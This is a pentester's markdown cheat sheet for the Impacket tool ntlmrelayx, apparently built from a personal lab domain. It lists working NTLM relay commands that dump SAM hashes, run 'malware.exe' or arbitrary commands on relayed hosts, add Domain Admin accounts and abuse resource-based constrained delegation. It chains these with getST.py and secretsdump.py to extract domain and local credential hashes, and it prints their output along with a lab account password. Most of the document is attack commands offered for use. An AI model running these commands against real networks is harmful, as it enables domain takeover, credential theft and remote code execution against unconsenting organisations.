# ntlmrelayx

## Relay to Workstations other Clients

### dump SAM

`ntlmrelayx.py -tf targets.txt -smb2support`

### interactive session

`ntlmrelayx.py -tf targets.txt -smb2support -i`

### Execute a file

`ntlmrelayx.py -tf targets.txt -smb2support -e malware.exe`

### Execute a command

`ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`

## Relay to AD with LDAP

### Basic command

This command will:

- dump LDAP information
- if credentials allow it
  - add a Domain Admin account (user is added to Enterprise Admins group)
  - setup a 'domain user' account with ACL rights to preform a DCsync.

`ntlmrelayx.py -6 -t ldaps://10.11.12.1 -wh wdap.lab.justin-p.me`

combine with secretsdump.py for fun.

```bash
secretsdump.py UDlGmXMPsh:'e=yZF&~+.RUJ|dh'@lab.justin-p.me -just-dc 
Impacket v0.9.21.dev1+20200209.151450.b938f422 - Copyright 2020 SecureAuth Corporation
                                              
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:a:a:::
Guest:501:a:a:::
krbtgt:502:a:a:::
```

### Create a computer account in AD

Any user can create up to 10 computer accounts. Using the command below we can use relayed credentials to create a computer account. By default it will create a random computer account in the default computer OU.

`ntlmrelayx.py -6 -t ldaps://10.11.12.1 -wh wdap.lab.justin-p.me --add-computer [OPTIONAL COMPUTERNAME]`

### Abuse msDS-AllowedToActOnBehalfOfOtherIdentity

Works by default and does not require any AD credentials to perform!

Computer accounts can modify some of their own properties via LDAP, which includes the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. This attribute controls which users can authenticate to the computer as almost any account in AD via impersonation using Kerberos. This concept is called Resource-Based constrained delegation.

We can abuse this when we relay a computer account credential by modifying this attribute to give ourselves rights impersonate users on that computer. 

The command below will add a new computer account to the domain, it will then add that computer account to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the relayed computer account.

`ntlmrelayx.py -6 -t ldaps://10.11.12.1 -wh wdap.lab.justin-p.me --delegate-access`

Combine with getST.py and secretsdump.py for complete control over workstation.

```bash
getST.py -spn cifs/LAB-PC01.lab.justin-p.me lab.justin-p.me/test-machine\$ -impersonate administrator
Impacket v0.9.21.dev1+20200209.151450.b938f422 - Copyright 2020 SecureAuth Corporation

Password:
[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache  
```

```bash
KRB5CCNAME=administrator.ccache 
secretsdump.py -k -no-pass LAB-PC01.lab.justin-p.me 
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb5f4662f815fdf939e16188273d583a2
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry 
```
